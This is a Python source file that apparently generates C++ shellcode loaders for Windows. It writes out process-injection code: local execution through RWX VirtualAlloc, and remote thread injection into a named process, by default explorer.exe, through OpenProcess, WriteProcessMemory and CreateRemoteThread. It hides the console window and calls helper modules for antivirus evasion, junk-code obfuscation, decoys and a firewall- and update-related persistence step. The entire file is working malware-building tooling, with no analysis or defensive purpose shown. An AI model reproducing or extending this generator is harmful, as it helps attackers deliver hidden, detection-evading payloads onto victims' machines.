from lib import core, evasion, decoy, junk, postexploit
from random import shuffle


def exercise_room(injection_type, processname, vShellcode, decoder_stub, architecture, junkcode, intensity, evasions, decoys, windows_firewall, windows_update, filename):
    exec_code = ""
    evasion_code = ""
    junkfunc_code = ""
    top_funcname_code = ""
    evasion_funcname, evasion_func = evasion.the_great_evasion(evasions, architecture, filename, junkcode, intensity)
    junkfuncname, junkcode_func = junk.junk_inject(junkcode, "func", intensity)
    decoy_code = decoy.fake_u(decoys, junkcode, intensity)
    xor_func, exec_stub = postexploit.hidden_forever(windows_firewall, windows_update, junkcode, intensity)
    final_code = ""

    if injection_type == "local":

        if junkcode == "yes":
            junkfunc_code += junkcode_func
            top_funcname_code += junkfuncname
            core.junkcode_added()
            core.junkfunc_added()

        if evasions == "yes":
            evasion_code += evasion_func
            top_funcname_code += evasion_funcname
            core.evasion_added()

        exec_code += local_thread_injection(vShellcode, decoder_stub, junkcode, intensity)
        final_code += body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity)

    elif injection_type == "remote":

        if junkcode == "yes":
            junkfunc_code += junkcode_func
            top_funcname_code += junkfuncname
            core.junkcode_added()
            core.junkfunc_added()

        if evasions == "yes":
            evasion_code += evasion_func
            top_funcname_code += evasion_funcname
            core.evasion_added()

        if processname != "":
            exec_code += remote_thread_injection(processname, vShellcode, decoder_stub, junkcode, intensity)
            final_code += body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity)

        else:
            processname = "explorer.exe"
            exec_code += remote_thread_injection(processname, vShellcode, decoder_stub, junkcode, intensity)
            final_code += body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity)

    return final_code


def body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity):
    final_code = headers()
    final_code += junkfunc_code
    final_code += xor_func
    final_code += evasion_code
    final_code += main()
    final_code += exec_stub
    top_funcname_code = shuffle_funcname(top_funcname_code, junkcode, intensity)
    final_code += top_funcname_code
    final_code += decoy_code
    final_code += exec_code
    return final_code


def shuffle_funcname(top_funcname_code, junkcode, intensity):
    top_funcname_code = top_funcname_code.splitlines()
    shuffle(top_funcname_code)
    new_line = ""

    for line in top_funcname_code:
        line += "\n"
        new_line += line
        if junkcode == "yes":
            new_line += junk.junk_inject(junkcode, "code", intensity)

    return new_line


def headers():
    header = "#include <windows.h>\n"
    header += "#include <memoryapi.h>\n"
    header += "#include <tlhelp32.h>\n"
    header += "#include <stdio.h>\n"
    header += "#include <stdlib.h>\n"
    header += "#include <time.h>\n"
    header += "#include <cmath>\n"
    return header


def main():
    hWnd = core.varname_creator()
    hw = "int main(int argc, char **argv){\n"
    hw += "HWND " + hWnd + " = GetConsoleWindow();\n"
    hw += "ShowWindow(" + hWnd + ", SW_HIDE);\n\n"
    return hw


def local_thread_injection(vShellcode, decoder_stub, junkcode, intensity):
    execs = core.varname_creator()
    lti = decoder_stub
    lti += junk.junk_inject(junkcode, "code", intensity)
    lti += "\nvoid *" + execs + " = VirtualAlloc(0, sizeof " + vShellcode + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    lti += junk.junk_inject(junkcode, "code", intensity)
    lti += "memcpy(" + execs + ", " + vShellcode + ", sizeof " + vShellcode + ");\n"
    lti += junk.junk_inject(junkcode, "code", intensity)
    lti += "((void(*)())" + execs + ")();\n"
    lti += "}\n"
    return lti


def remote_thread_injection(processname, vShellcode, decoder_stub, junkcode, intensity):
    entry = core.varname_creator()
    snapshot = core.varname_creator()
    process_handle = core.varname_creator()
    remote_thread = core.varname_creator()
    remote_buffer = core.varname_creator()
    rti = decoder_stub
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "\nPROCESSENTRY32 " + entry + ";\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += entry + ".dwSize = sizeof(PROCESSENTRY32);\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "HANDLE " + snapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "if (Process32First(" + snapshot + ", &" + entry + ") == TRUE)\n"
    rti += "{\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "while (Process32Next(" + snapshot + ", &" + entry + ") == TRUE)\n"
    rti += "{\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += 'if (stricmp(' + entry + '.szExeFile, ' + '"' + processname + '"' + ') == 0)'
    rti += '{\n'
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "HANDLE " + process_handle + ";\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "HANDLE " + remote_thread + ";\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "PVOID " + remote_buffer + ";\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += process_handle + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + entry + ".th32ProcessID);\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += remote_buffer + " = VirtualAllocEx(" + process_handle + ", NULL, sizeof " + vShellcode + ", (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "WriteProcessMemory(" + process_handle + ", " + remote_buffer + ", " + vShellcode + ", sizeof " + vShellcode + ", NULL);\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += remote_thread + " = CreateRemoteThread(" + process_handle + ", NULL, 0, (LPTHREAD_START_ROUTINE)" + remote_buffer + ", NULL, 0, NULL);\n"
    rti += junk.junk_inject(junkcode, "code", intensity)
    rti += "CloseHandle(" + process_handle + ");}}}\n"
    rti += "CloseHandle(" + snapshot + ");"
    rti += "}\n"
    return rti
